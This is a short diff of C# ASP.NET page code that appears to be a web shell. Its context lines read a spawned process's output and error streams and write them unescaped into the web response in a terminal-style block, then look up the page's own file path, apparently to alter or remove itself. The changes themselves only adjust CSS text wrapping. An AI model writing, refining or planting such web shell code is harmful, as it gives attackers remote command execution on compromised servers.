@@ -36,10 +36,10 @@
                     string output = process.StandardOutput.ReadToEnd();
                     string error = process.StandardError.ReadToEnd();
 
-                    Response.Write("<pre style='background-color: #1e1e1e; color: #00ff00; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; margin-bottom: 20px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;'>" + output + "</pre>");
+                    Response.Write("<pre style='background-color: #1e1e1e; color: #00ff00; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; margin-bottom: 20px; overflow-x: auto; white-space: pre; word-wrap: normal;'>" + output + "</pre>");
                     if (!string.IsNullOrEmpty(error))
                     {
-                        Response.Write("<pre style='background-color: #1e1e1e; color: #ff4c4c; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; margin-bottom: 20px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;'>" + error + "</pre>");
+                        Response.Write("<pre style='background-color: #1e1e1e; color: #ff4c4c; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; margin-bottom: 20px; overflow-x: auto; white-space: pre; word-wrap: normal;'>" + error + "</pre>");
                     }
 
                     string filePath = Server.MapPath(Request.Path);
@@ -49,7 +49,7 @@
                 }
                 catch (Exception ex)
                 {
-                    Response.Write("<pre style='color:red; background-color: #1e1e1e; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word;'>Error: " + ex.Message + "</pre>");
+                    Response.Write("<pre style='color:red; background-color: #1e1e1e; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; white-space: pre; word-wrap: normal;'>Error: " + ex.Message + "</pre>");
                 }
             }
 
